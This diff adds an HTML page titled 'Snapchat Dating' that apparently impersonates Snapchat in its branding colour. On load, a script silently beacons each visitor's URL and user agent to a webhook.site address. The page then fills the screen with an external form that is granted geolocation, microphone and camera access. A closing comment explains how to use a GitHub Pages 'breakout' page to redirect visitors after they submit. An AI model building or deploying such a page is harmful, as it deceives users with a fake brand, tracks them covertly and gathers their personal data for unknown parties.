@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Snapchat Dating</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    html, body { height:100%; margin:0; background:#FFFC00; } /* Snapchat yellow */
+    iframe { position:fixed; inset:0; width:100vw; height:100vh; border:0; background:transparent; }
+  </style>
+</head>
+<body>
+  <script>
+    // 1) Fire webhook silently in the background
+    (function () {
+      const WEBHOOK_URL = "https://webhook.site/55b80994-a2c4-4b3f-a87d-731c6e91d0d1";
+      try {
+        const ts = new Date().toISOString();
+        const logUrl = WEBHOOK_URL + "?event=embed_load&ts=" + encodeURIComponent(ts);
+        const payload = { ts_iso: ts, event: "embed_load", href: location.href, ua: navigator.userAgent || "" };
+        if (navigator.sendBeacon) {
+          const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
+          navigator.sendBeacon(logUrl, blob);
+        } else {
+          fetch(logUrl, { method: "POST", mode: "no-cors", keepalive: true, body: JSON.stringify(payload) }).catch(()=>{});
+        }
+      } catch (_) {}
+    })();
+  </script>
+
+  <!-- 2) Full-screen Forms.app embed (no extras) -->
+  <iframe
+    allowtransparency="true"
+    allowfullscreen="true"
+    allow="geolocation; microphone; camera"
+    src="https://36o7vyhi.forms.app/form/68ee0e94a9271200029d3f93"
+    frameborder="0"
+    style="width: 100vw; min-width:100%; height:100vh; border:none;">
+  </iframe>
+
+  <!-- NOTE:
+       Browsers won't let an iframe change the top window directly to another site.
+       To make the form's "Redirect after submit" open full-page, set the redirect URL
+       in Forms.app to your own breakout page (e.g. https://conquere139-maker.github.io/080498/).
+       That page promotes itself to the top window, then forwards wherever you want.
+  -->
+</body>
+</html>
